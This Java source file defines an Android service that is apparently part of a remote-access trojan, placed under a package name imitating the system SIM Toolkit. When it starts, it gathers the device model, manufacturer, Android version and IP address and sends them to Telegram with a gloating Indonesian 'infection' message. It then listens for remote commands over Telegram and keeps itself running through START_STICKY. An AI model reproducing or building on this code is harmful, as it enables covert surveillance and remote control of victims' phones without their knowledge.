package com.android.stk.service;

import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Collections;
import java.util.Enumeration;

public class MainService extends Service {

    @Override
    public void onCreate() {
        super.onCreate();

        String message = "✅ Khodam Telah Masuk Bosku Di HP\n" +
                "📱 Model: " + Build.MODEL + "\n" +
                "🏭 Merek: " + Build.MANUFACTURER + "\n" +
                "📟 Android: " + Build.VERSION.RELEASE + "\n" +
                "🌐 IP: " + getIPAddress();

        try {
            TelegramSender.sendText(message);
        } catch (Exception ignored) {}

        TelegramCommandReceiver.startListening(getApplicationContext());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // agar service tetap berjalan
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private String getIPAddress() {
        try {
            for (NetworkInterface intf : Collections.list(NetworkInterface.getNetworkInterfaces())) {
                if (!intf.isUp() || intf.isLoopback()) continue;

                Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses();
                while (enumIpAddr.hasMoreElements()) {
                    InetAddress addr = enumIpAddr.nextElement();
                    if (!addr.isLoopbackAddress() && addr.getHostAddress().indexOf(':') < 0) {
                        return addr.getHostAddress();
                    }
                }
            }
        } catch (Exception ignored) {}
        return "Unknown";
    }
}
